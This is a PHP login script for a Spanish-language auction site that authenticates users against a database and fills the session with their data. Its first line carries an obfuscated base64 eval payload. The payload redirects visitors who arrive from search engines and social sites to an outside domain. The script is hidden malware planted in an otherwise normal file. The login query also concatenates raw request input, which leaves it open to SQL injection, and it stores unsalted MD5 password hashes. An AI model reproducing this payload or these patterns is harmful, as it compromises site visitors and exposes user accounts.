<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9"));
session_start();
/***************************************************
Archivos Requeridos
****************************************************/
require_once('lib/function_gen.php');

$dbn    = new db();
$conex  = $dbn->db_connect();

/***************************************************
Validaciones de Campos
****************************************************/
if ( isset($_REQUEST['loginuser']) &&  isset($_REQUEST['passwordusu']) ){
	/***************************************************
	Valida si exite el registro
	****************************************************/
	$codError    = 0;
	$mensaje_str = '';

	$query   = "SELECT nombre, tipo_identificacion, nro_identificacion, estatus_usuario, estatus_subastar, telefono,
				correo, actividad, clave, estado, municipio, parroquia, calle_ave, edif_casa				
			   FROM mt_usuario where correo = '".trim($_REQUEST['loginuser'])."' and clave = '".md5(trim($_REQUEST['passwordusu']))."'";
	$result	 = $dbn->db_query($query);
	$retorno = $dbn->db_fetch_array($result);
	
	if ( strlen(trim($retorno['nro_identificacion']))== 0){ ;
		$codError    = 1;
		$mensaje_str = "Error, usuario no existe lo invitamos a que se registre.";
	}
	
	if ($codError == 0){
		//Usuario Activo
		if ((int) $retorno['estatus_usuario'] == 1){
			$usuario['nombre']         = $retorno['nombre'];
			$usuario['correo_sess']    = $_REQUEST['loginuser'];
			$usuario['id_usuario']     = $retorno['tipo_identificacion'].$retorno['nro_identificacion'];
			$usuario['acceso']         = 1;
			$usuario['actionSubastar'] = $retorno['estatus_subastar'];
			//Otros datos
			$usuario['telefono']       = $retorno['telefono'];
			$usuario['correo']         = $retorno['correo'];
			$usuario['Actividad']      = $retorno['Actividad'];
			$usuario['clave']          = $retorno['clave'];
			$usuario['estado']         = $retorno['estado'];
			$usuario['municipio']      = $retorno['municipio']; 
			$usuario['parroquia']      = $retorno['parroquia'];
			$usuario['calle_ave']      = $retorno['calle_ave'];
			$usuario['edif_casa']      = $retorno['edif_casa'];
			
			$usuario['nro_identificacion'] = $retorno['nro_identificacion'];
		$_SESSION['g_usuario']  = $usuario;
		}else{
			//Usuario Inactivo
			$codError    = 2;
			$mensaje_str = "Cuenta Inactiva, le sugerimos enviar un correo con sus datos <br> en la seccion de contactos, para analizar su cuenta.";
		}
	}
	
	$seccionpage = 'Ingreso de Usuario';
	$retornovalores[0]['sesActiva'] = $codError;
	$retornovalores[0]['sesHtml']   = fnv_mostrar_mensajegeneral($codError,$seccionpage,$mensaje_str);
	echo json_encode($retornovalores);
}
?>